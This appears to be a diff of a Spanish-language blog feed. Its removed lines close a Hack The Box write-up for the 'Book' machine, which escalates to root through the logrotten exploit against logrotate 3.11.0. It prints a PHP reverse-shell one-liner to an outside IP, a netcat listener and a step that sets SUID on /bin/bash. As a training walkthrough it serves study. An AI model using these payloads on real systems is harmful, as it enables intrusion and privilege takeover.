-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1160   | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1150   | /usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1126   | /sbin/agetty &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--noclear&lt;/span&gt; tty1 linux 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1105   | /usr/lib/snapd/snapd 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1104   | /usr/sbin/irqbalance &lt;span class=&quot;nt&quot;&gt;--foreground&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1102   | /usr/lib/accountsservice/accounts-daemon 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1101   | /usr/bin/lxcfs /var/lib/lxcfs/ 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;102  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1100   | /usr/sbin/rsyslogd &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;11     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1099   | /usr/bin/python3 /usr/bin/networkd-dispatcher &lt;span class=&quot;nt&quot;&gt;--run-startup-triggers&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1098   | /usr/sbin/atd &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1097   | /usr/bin/VGAuthService 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1096   | /lib/systemd/systemd-logind 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1086   | /bin/sh /root/reset.sh 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1084   | /bin/sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; /root/reset.sh 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1070   | /usr/sbin/CRON &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;103  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1069   | /usr/bin/dbus-daemon &lt;span class=&quot;nt&quot;&gt;--system&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;systemd: &lt;span class=&quot;nt&quot;&gt;--nofork&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--nopidfile&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--systemd-activation&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--syslog-only&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1065   | /usr/sbin/cron &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1      | /sbin/init auto automatic-ubiquity noprompt 
-2022/01/24 04:29:44 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4167   | /usr/sbin/logrotate &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /root/log.cfg 
-2022/01/24 04:29:44 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4166   | /bin/sh /root/log.sh 
-2022/01/24 04:29:44 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4168   | &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;5 
-2022/01/24 04:29:49 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4169   | /bin/sh /root/log.sh 
-2022/01/24 04:29:49 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4171   | /usr/sbin/logrotate &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /root/log.cfg 
-2022/01/24 04:29:49 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4172   | &lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;5 
-2022/01/24 04:29:50 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4173   | 
-^CExiting program... &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;interrupt&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-reader@book:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que el usuario &lt;strong&gt;root&lt;/strong&gt; está ejecutando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/sbin/logrotate -f /root/log.cfg&lt;/code&gt;, por lo que vamos a ver la versión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logrotate&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;logrotate &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
-logrotate 3.11.0
-reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a buscar posibles exploits que nos ayuden a escalar privilegios abusando de dicho binario y encontramos &lt;a href=&quot;https://github.com/whotwagner/logrotten&quot;&gt;logrotten&lt;/a&gt;, en donde nos explican que pasos debemos de seguir; así que vamos a hacerlo.&lt;/p&gt;
-
-&lt;p&gt;Primero nos vamos a crear el archivo  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logrotten.c&lt;/code&gt; en la máquina víctima y vamos a compilarlo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano logrotten.c
-reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gcc logrotten.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; logrotten
-reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ll
-total 1064
-drwxrwxrwt  2 root   root       100 Jan 24 04:42 ./
-drwxr-xr-x 18 root   root      3960 Jan 24 04:16 ../
-&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt;  1 reader reader   17984 Jan 24 04:42 logrotten&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;  1 reader reader    7343 Jan 24 04:42 logrotten.c
-&lt;span class=&quot;nt&quot;&gt;-rwxrwxr-x&lt;/span&gt;  1 reader reader 1059492 Jan 24 00:53 pspy&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-reader@book:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con lo que nos dice el autor del exploit, debemos crear un archivo de nombre `
-payloadfile&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt; que almacene un comando de reverse shell, que para este caso vamos a utilizar &lt;/code&gt;bash` y le daremos permisos de ejecución.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nano payloadfile
-reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x payloadfile 
-reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;payloadfile 
-php &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'&lt;/span&gt;
-reader@book:/dev/shm&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Por último, necesitamos apuntar hacia un archivo de extensión &lt;strong&gt;.log&lt;/strong&gt;, el cual lo encontramos en la ruta del usuario &lt;strong&gt;reader&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:~/backups&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ll
-total 12
-drwxr-xr-x 2 reader reader 4096 Jul 20  2021 ./
-drwxr-xr-x 7 reader reader 4096 Jan 24 04:42 ../
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 reader reader    0 Jan 29  2020 access.log
-&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 reader reader   91 Jan 29  2020 access.log.1
-reader@book:~/backups&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ejecutamos el exploit de acuerdo a como nos indica el repositorio:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./logrotten &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; payloadfile /home/reader/backups/access.log
-Waiting &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;rotating /home/reader/backups/access.log...
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora, ingresamos a la máquina con otra sesión, nos ponemos en escucha por el puerto 443 y en la nueva sesión escribimos cualquier cosa en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/reader/backups/access.log&lt;/code&gt; (&lt;strong&gt;Nota&lt;/strong&gt;: Es posible que no nos jale a la primera, así que hay que volver a ejecutar el exploit hasta que nos entable una reverse shell):&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;k4miyo&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; /home/reader/backups/access.log
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.176] 48078
-&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
-root
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Debido a que la sesión muere despúes de unos segundos, vamos a tratar de darle permisos SUID a la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.176] 52130
-&lt;span class=&quot;c&quot;&gt;# chmod 4755 /bin/bash&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Hangup&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En cualquier sesión que tengamos, validamos los permisos de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; /bin/bash
-&lt;span class=&quot;nt&quot;&gt;-rwsr-xr-x&lt;/span&gt; 1 root root 1113504 Apr  4  2018 /bin/bash
-reader@book:/dev/shm&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt;
-bash-4.4# &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;root
-bash-4.4#
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="LFI" /><category term="Web" /><summary type="html">Resolución de la máquina Book en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;Administrator&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Active_Directory" /><category term="Powershell" /><category term="Kerberoasting" /><summary type="html">Resolución de la máquina Sauna en la plataforma de Hack The Box</summary></entry></feed>
